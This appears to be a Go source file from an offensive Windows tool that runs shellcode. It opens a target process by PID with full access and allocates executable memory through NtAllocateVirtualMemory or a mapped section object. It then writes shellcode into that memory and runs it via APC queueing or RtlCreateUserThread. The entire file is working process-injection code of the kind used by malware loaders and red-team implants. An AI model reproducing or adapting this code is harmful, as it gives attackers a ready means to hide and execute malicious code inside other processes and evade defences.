package runsc

import (
	"golang.org/x/sys/windows"

	"github.com/mjwhitta/errors"
	w32 "github.com/mjwhitta/win/api"
)

type state struct {
	a  uintptr
	l  *Launcher
	p  windows.Handle
	s  windows.Handle
	sz int
	t  windows.Handle
}

func allocate(s *state) (*state, error) {
	var e error
	var rwx uintptr

	switch s.l.alloc {
	case NtAllocateVirtualMemory:
		s.a, e = w32.NtAllocateVirtualMemory(
			s.p,
			uint64(s.sz),
			w32.Winnt.MemCommit|w32.Winnt.MemReserve,
			w32.Winnt.PageExecuteReadwrite,
		)
		if e != nil {
			e = errors.Newf("failed to allocate memory: %w", e)
			return nil, e
		}
	case NtCreateSection:
		rwx = w32.Winnt.SectionMapRead
		rwx |= w32.Winnt.SectionMapWrite
		rwx |= w32.Winnt.SectionMapExecute

		// Get handle for section object
		e = w32.NtCreateSection(
			&s.s,
			rwx,
			uint64(s.sz),
			w32.Winnt.PageExecuteReadwrite,
			w32.Winnt.SecCommit,
		)
		if e != nil {
			e = errors.Newf("failed to allocate memory: %w", e)
			return nil, e
		}

		// Create RW view
		s.a, e = w32.NtMapViewOfSection(
			s.s,
			windows.CurrentProcess(),
			uint64(s.sz),
			w32.Accctrl.SubContainersOnlyInherit,
			w32.Winnt.PageReadwrite,
		)
		if e != nil {
			e = errors.Newf("failed to access memory as RW: %w", e)
			return nil, e
		}
	}

	return s, nil
}

func getProcessHandle(s *state) (*state, error) {
	var e error

	// Get process handle
	if s.l.pid == 0 {
		s.p = windows.CurrentProcess()
	} else {
		s.p, e = w32.NtOpenProcess(
			s.l.pid,
			w32.Winnt.ProcessAllAccess,
		)
		if e != nil {
			e = errors.Newf("failed to get process handle: %w", e)
			return nil, e
		}
	}

	return s, nil
}

func run(s *state) (*state, error) {
	var e error

	switch s.l.run {
	case NtQueueApcThread, NtQueueApcThreadEx:
		s.t, e = w32.RtlCreateUserThread(s.p, 0, s.l.suspend)
		if e != nil {
			return nil, errors.Newf("failed to create thread: %w", e)
		}
	}

	switch s.l.run {
	case NtQueueApcThread:
		e = w32.NtQueueApcThread(s.t, s.a)
	case NtQueueApcThreadEx:
		e = w32.NtQueueApcThreadEx(s.t, s.a)
	case RtlCreateUserThread:
		s.t, e = w32.RtlCreateUserThread(s.p, s.a, s.l.suspend)
	}

	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func write(s *state, sc []byte) (*state, error) {
	var e error
	var pHndl windows.Handle = s.p

	switch s.l.alloc {
	case NtCreateSection:
		pHndl = windows.CurrentProcess()
	}

	switch s.l.write {
	case NtWriteVirtualMemory:
		e = w32.NtWriteVirtualMemory(pHndl, s.a, sc)
		if e != nil {
			e = errors.Newf("failed to write shellcode: %w", e)
			return nil, e
		}
	}

	switch s.l.alloc {
	case NtCreateSection:
		// Create RX view
		s.a, e = w32.NtMapViewOfSection(
			s.s,
			s.p,
			uint64(s.sz),
			w32.Accctrl.SubContainersOnlyInherit,
			w32.Winnt.PageExecuteRead,
		)
		if e != nil {
			e = errors.Newf("failed to access memory as RX: %w", e)
			return nil, e
		}
	}

	return s, nil
}
